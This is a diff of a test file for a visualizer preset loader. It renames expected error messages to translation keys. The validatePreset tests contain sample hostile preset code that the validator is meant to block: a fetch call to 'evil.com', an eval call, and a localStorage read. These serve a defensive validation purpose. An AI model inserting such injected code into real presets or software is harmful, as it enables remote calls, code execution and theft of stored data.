@@ -13,24 +13,24 @@ describe('readMilkFile', () => {
 
   it('rejects .milk2 files (unsupported double-preset format)', async () => {
     const file = new File(['content'], 'My Preset.milk2');
-    await expect(readMilkFile(file)).rejects.toThrow('Invalid file type');
+    await expect(readMilkFile(file)).rejects.toThrow('invalidFileType');
   });
 
   it('rejects non-.milk extensions', async () => {
     const file = new File(['content'], 'bad.txt');
-    await expect(readMilkFile(file)).rejects.toThrow('Invalid file type');
+    await expect(readMilkFile(file)).rejects.toThrow('invalidFileType');
   });
 
   it('rejects files larger than 500KB', async () => {
     const bigContent = 'x'.repeat(500_001);
     const file = new File([bigContent], 'big.milk');
-    await expect(readMilkFile(file)).rejects.toThrow('File too large');
+    await expect(readMilkFile(file)).rejects.toThrow('fileTooLarge');
   });
 
   it('rejects empty files', async () => {
     const file = new File([''], 'empty.milk');
     Object.defineProperty(file, 'size', { value: 0 });
-    await expect(readMilkFile(file)).rejects.toThrow('File is empty');
+    await expect(readMilkFile(file)).rejects.toThrow('emptyFile');
   });
 
   it('handles case-insensitive extension', async () => {
@@ -55,21 +55,21 @@ describe('validatePreset', () => {
     const preset = {
       init_eqs_str: 'x = fetch("http://evil.com");',
     };
-    expect(() => validatePreset(preset)).toThrow('Blocked identifier');
+    expect(() => validatePreset(preset)).toThrow('securityBlocked');
   });
 
   it('throws on blocked identifier in nested shapes', () => {
     const preset = {
       shapes: [{ frame_eqs_str: 'y = eval("bad");' }],
     };
-    expect(() => validatePreset(preset)).toThrow('Blocked identifier');
+    expect(() => validatePreset(preset)).toThrow('securityBlocked');
   });
 
   it('throws on blocked identifier in nested waves', () => {
     const preset = {
       waves: [{ per_frame_eqs_str: 'z = localStorage.getItem("x");' }],
     };
-    expect(() => validatePreset(preset)).toThrow('Blocked identifier');
+    expect(() => validatePreset(preset)).toThrow('securityBlocked');
   });
 
   it('allows normal EEL code without blocked identifiers', () => {
